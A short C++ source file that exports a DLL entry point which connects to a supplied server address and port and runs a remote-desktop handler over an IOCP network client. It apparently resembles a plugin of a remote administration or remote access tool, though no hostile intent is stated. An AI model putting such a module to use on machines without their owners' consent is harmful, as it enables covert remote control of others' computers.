#include "RemoteDesktop.h"
#include "IOCPClient.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
	CRemoteDesktop rd;
	CIOCPClient io(szServerAddr, uPort);

	io.BindHandler(&rd);
	io.Run();
	io.UnbindHandler();

}